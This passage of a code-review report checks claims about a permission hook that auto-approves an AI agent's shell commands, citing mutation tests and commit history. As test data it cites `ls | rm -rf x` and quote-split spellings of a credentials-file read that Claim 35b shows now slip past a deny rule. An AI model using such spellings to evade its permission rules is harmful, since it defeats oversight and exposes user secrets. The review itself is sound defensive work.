See the cited claims. Row 53 is at `docs/decisions/log.md:76`.

**Evidence:** `docs/decisions/log.md:76`, `hooks/auto-approve-allowed-commands.sh:376-436`

---

## Claim 29: "the hook's stdout is empty or exactly the allow decision: never ask, deny or defer" with comment "over main's exit paths for approved, refused, unparseable, unlisted, empty and malformed input (the jq-missing exit is not reached). Statically: the source spells exactly one decision."

**Location:** `test/auto-approve-allowed-commands.bats:147-170`
**Type:** Behavioral
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers each named exit path through a mutant that prints a variable-built decision there, so the static grep cannot see it: raw-deny, parse failure, no allow rules, empty command, nothing extracted, final block and bad input JSON. It also covers an altered allow JSON. It does not cover the jq-missing exit, or `--debug` writing to stdout; `--debug` is never wired.

All 8 mutants are killed by this test alone (`logs/mutants.txt`, `ask-on-*`, `deny-on-final-block`, `allow-json-extra-field`). The static line `grep -o '"permissionDecision":"[a-z]*"' "$HOOK" | sort -u` must equal the allow value.

**Evidence:** `test/auto-approve-allowed-commands.bats:147-170`, `logs/mutants.txt`

---

## Claim 30a: "Pins the per-extracted-command check and add_deny_rule's escaping, which the raw check alone does not exercise (security review q092a, finding 1)."

**Location:** `test/auto-approve-allowed-commands.bats:214-215`
**Type:** Behavioral
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers the extracted check (`ls | rm -rf x`; the raw string starts with `ls` and does not match `rm\ -rf*`) and the escaping of `[`, `]` and `?`.

The `no-extracted-deny-check`, `no-escaping`, `brackets-live` and `question-mark-live` mutants are all killed (`logs/mutants.txt`).

**Evidence:** `test/auto-approve-allowed-commands.bats:213-228`, `logs/mutants.txt`

---

## Claim 30b: test title "…; only * is a wildcard"

**Location:** `test/auto-approve-allowed-commands.bats:213`
**Type:** Behavioral
**Verdict:** Mostly accurate
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers which wildcard families the assertions pin. Extglob characters are not pinned; the header (:91) does list them.

The test pins `[...]` and `?`. A copy of the hook in which `( ) | @ ! +` stay unescaped changes real decisions: it blocks `cat a.txt` under `Bash(cat @(a|b).txt)`, which the real hook approves. That copy still passes this test (`logs/extglob.txt`: `bats on mutant: ok 1 a prefix deny rule blocks …`). Precise version: "`?` and `[...]` are literal", or add an extglob case such as `Bash(cat @(a|b).txt)` against `cat a.txt`. Unit 2 deletes this test together with the deny reader, so the gap is short-lived.

**Evidence:** `test/auto-approve-allowed-commands.bats:213-228`, `logs/extglob.txt`

---

## Claim 31: "the hook ignores a --deny argument (the option was removed in Q-092)"

**Location:** `test/auto-approve-allowed-commands.bats:269-273`
**Type:** Behavioral
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers `--deny '["Bash"]'` with `--permissions`. `main`'s `*) shift` arm (:351-353) drops `--deny`; its JSON value is then dropped as a separate argument.

The test passes (`logs/bats-full.txt`).

**Evidence:** `hooks/auto-approve-allowed-commands.sh:341-355`, `logs/bats-full.txt`

---

## Claim 32: Settings fail-closed test titles: malformed global (:278), wrong shapes (:291), unparseable project file with a well-formed local file (:303), CLAUDE_CONFIG_DIR (:314), relative (:334), newline (:346), NUL in a settings allow rule (:358)

**Location:** `test/auto-approve-allowed-commands.bats:275-365`
**Type:** Behavioral
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers that each title matches its assertions and that the suite passes. For :334, :346 and :358, the allow rule each test would expose (`cat`, `ls`, `curl`) is approved only if the guarded check is removed; this was read, not mutated.

Each title's assertion was read against the code it exercises (:157-205, :265-288). All pass (`logs/bats-full.txt`).

**Evidence:** `test/auto-approve-allowed-commands.bats:275-365`, `logs/bats-full.txt`

---

## Claim 33: "a NUL inside a --permissions rule drops that rule only" / "Split rather than dropped, the second half would approve curl."

**Location:** `test/auto-approve-allowed-commands.bats:367-373`
**Type:** Behavioral
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers both directions: a split (no NUL filter) and "drops everything" (fail all on a NUL).

The `permissions-no-nul-filter` and `permissions-nul-fails-all` mutants are both killed (`logs/mutants.txt`).

**Evidence:** `hooks/auto-approve-allowed-commands.sh:281-287`, `logs/mutants.txt`

---

## Claim 34: Rule-table tests: "Bash(ls) is a command prefix", "Bash(rm:*) is a word prefix", "Bash(ls *) is a literal prefix, not a glob", "a bare Bash rule is ignored"

**Location:** `test/auto-approve-allowed-commands.bats:393-417`
**Type:** Behavioral
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers the allow column only, as the section title says.

The `allow-rule-glob`, `allow-strip-trailing-star` and `allow-star-rule-ignored` mutants are each killed by the `Bash(ls *)` test (`logs/mutants.txt`). The other three rows match `logs/ruletable.txt`.

**Evidence:** `test/auto-approve-allowed-commands.bats:393-417`, `logs/mutants.txt`, `logs/ruletable.txt`

---

## Claim 35a: "removes the parts nothing outside the tests used: the --deny test option"

**Location:** commit 1a831ffe message, paragraph 1
**Type:** Architectural
**Verdict:** Verified
**Confidence:** High
**Verification mode:** static
**Scope:** Covers in-repo callers (pass 1 Claim 1, re-read here). Private callers outside the repo are not covered.

The wiring passes no options (`hooks/wiring.json:78`).

**Evidence:** `hooks/wiring.json:78`

---

## Claim 35b: "removes the parts nothing outside the tests used: … and the de-quoted match (quotes, backslashes and ${NAME:-word} defaults)"

**Location:** commit 1a831ffe message, paragraph 1
**Type:** Architectural / Behavioral
**Verdict:** Incorrect
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers the de-quoted atom only. The same message's Notes line does call the quote-split spelling "now a listed residual", so the body contradicts itself rather than hiding the change.

The de-quoted match was not test-only. At 00a27a2f it ran inside `matches_deny` on every production call: `main` calls `matches_deny` on the raw command and on each extracted command, with deny rules read from the settings files (the diff removes `dq=${str//[\'\"\\]/}` and `if [[ "$str" == $glob || "$dq" == $glob ]]`). Executed with settings-file deny rules only, no `--deny`: at 00a27a2f, `cat ~/.claude/.cred""entials.json`, `.c\redentials.json`, `cat ~/.claude/.cred''entials.json`, `git "push" origin main` and `cat "secret"` are `not-approved`. At 5ba83a3a they are `APPROVED` (`logs/residuals-at-00a27a2f.txt` vs `logs/residuals.txt`). So with the wired `Bash(*.credentials.json*)` rule, production decisions changed. Precise version: "the --deny option, which nothing outside the tests used, and the de-quoted match, whose coverage Claude Code's own deny now has to provide (F3)". This is a commit message, so the fix is to record it, not to rewrite history.

**Evidence:** `git diff 00a27a2f..1a831ffe -- hooks/` (the `matches_deny` hunk), `logs/residuals-at-00a27a2f.txt`, `logs/residuals.txt`

---

## Claim 36: 1a831ffe: Q-082 / decision log 53 (amended 2026-09-28); "Tests leave --deny: the rule-table and --permissions NUL tests keep only their allow halves, and the fail-closed, CLAUDE_CONFIG_DIR and NUL tests take the allow-only form"; the new stdout test; the quote-split residual; "No gate trailer: hooks/ and test/ are outside live-verify-gate's sets."

**Location:** commit 1a831ffe message
**Type:** Reference / Behavioral
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers each listed test change as of 1a831ffe and 5ba83a3a. Unit 2 later changes the wrong-shape list (its non-string skip, Claim 11a). So "the form unit 2 needs" held for the deny-free form, not for the `deny:[1]` entry.

`--deny` now appears in the test file only in the "ignores a --deny argument" test (:269-273). The other parts are covered by Claims 2, 3, 6, 22 and 29.

**Evidence:** `test/auto-approve-allowed-commands.bats:269-417`, `hooks/live-verify-gate.sh:83-93`

---

## Claim 37: 1a831ffe: "Split under the decision-62 cap (whole change 652 lines; this unit ~365)"

**Location:** commit 1a831ffe message, Notes
**Type:** Configuration
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers the counts at the time (Claim 17a).

365 at 1a831ffe and 652 at ed06dec1.

**Evidence:** numstat counts (Claim 17a)

---

## Claim 38: b973e678: NUL --permissions test "now uses an input a split would approve"; rule table says `Bash(ls *)` is a literal prefix and a test pins it; ROLE cites Q-082; a settings-file test pins the extracted check and escaping; the residual list names backslash and whole-word quoting; two header errors corrected

**Location:** commit b973e678 message
**Type:** Behavioral / Reference
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers each listed change at 5ba83a3a. The F3 attribution sentence is rubric C8 (accepted) and is not re-verdicted.

See Claims 19, 20, 22, 23, 24, 30a, 33 and 34.

**Evidence:** `logs/mutants.txt`, `logs/ruletable.txt`, `logs/residuals.txt`

---

## Claim 39: b973e678: "Unit size 403 after this commit (loop tolerance ~800). false/null permission lists counting as absent is left to unit 2's stricter check."

**Location:** commit b973e678 message, Notes
**Type:** Configuration / Behavioral
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers the count at b973e678, the decision-62 amendment, and unit 2's handling of null/false.

`00a27a2f..b973e678` = 403. Decision 62 is amended with "growth up to ~800 lines is tolerated" (`docs/decisions/log.md:85`). On unit 2, `permissions:null`, `allow:null`, `allow:false`, `deny:false` and `deny:null` all give `not-approved`; on unit 1 they give `APPROVED` (`logs/f6-u2.txt`, `logs/f6-u1.txt`).

**Evidence:** `docs/decisions/log.md:85`, `logs/f6-u1.txt`, `logs/f6-u2.txt`

---

## Claim 40: dbb15ec6: "a mutant that left `?` live passed. Adds the `Bash(cat file?.txt)` case." / "b973e678's message misattributes plan F3's source and omits F6b"

**Location:** commit dbb15ec6 message
**Type:** Behavioral / Reference
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers the added case and that the `?`-live mutant is now killed. The pre-fix survival is taken from the pass-2 report.

The `Bash(cat file?.txt)` deny rule and the `cat file?.txt` / `cat file1.txt` assertions are present (:216-227), and `question-mark-live` is killed (`logs/mutants.txt`). `git diff 1a831ffe b973e678 -- docs/working/…` adds the `| F6b |` row, which b973e678's message does not mention.

**Evidence:** `test/auto-approve-allowed-commands.bats:213-228`, `logs/mutants.txt`

---

## Claim 41: 5ba83a3a: "review artifacts only"

**Location:** commit 5ba83a3a message
**Type:** Architectural
**Verdict:** Verified
**Confidence:** High
**Verification mode:** static
**Scope:** Covers the commit's file list.

`git show --stat 5ba83a3a` lists only three `docs/reviews/` files (175 insertions, 2 deletions).

**Evidence:** `git show --stat 5ba83a3a`

---

## Claims Requiring Attention

### Incorrect
- **Claim 35b** (commit 1a831ffe, paragraph 1): says the de-quoted match was something "nothing outside the tests used". It ran on every production call, and removing it changed production decisions (quote and backslash spellings are now approved under settings-file deny rules). Record this in the rubric; the message itself stays as is.

### Stale
- **Claim 11a** (`docs/working/plan-q092-drop-hook-deny-reader.md:41`): F6's "U2 makes each … an array of NUL-free strings" / "no approval for … a bad `allow`, `deny` or `ask`" predates unit 2's 0444b1ac, which skips non-string entries (`deny:[1]` and friends are now approved). Reword it as "an array whose string entries are NUL-free; non-strings skipped".
- **Claim 17b** (`docs/working/plan-q092-drop-hook-deny-reader.md:81-82`): "each under 400" no longer holds. Unit 1 is 407 and unit 2 is 436, within the amended ~800 loop tolerance.

### Mostly Accurate
- **Claim 30b** (`test/auto-approve-allowed-commands.bats:213`): the title "only * is a wildcard" pins `?` and `[...]` but not extglob characters; a live-extglob mutant passes. Narrow the title or add an extglob case. Unit 2 deletes the test.

### Unverifiable
- **Claim 15** (`docs/working/plan-q092-drop-hook-deny-reader.md:48-51`): "and by Claude Code's string matcher" (that `.c*` passes Claude Code's deny) needs a host run.

---

## Goal-Alignment Note

The goal is to land Q-092 unit 1, reviewed clean. Behaviour, header and tests agree. Every header claim the brief named was run, including each residual spelling and each rule-table row. All 17 mutants against the four named tests were killed, and the full suite is 43/43 green. The non-Verified items are all in prose: one commit message (immutable; record it), two plan rows that unit 2's later commits or growth made out of date (a one-line plan edit each), one test title that over-claims by one wildcard family (deleted in unit 2), and one statement about Claude Code that needs a host. None changes the hook's behaviour or blocks the merge on correctness grounds. Claim 17b is a size observation for the orchestrator's decision-62 re-check, not a code defect.
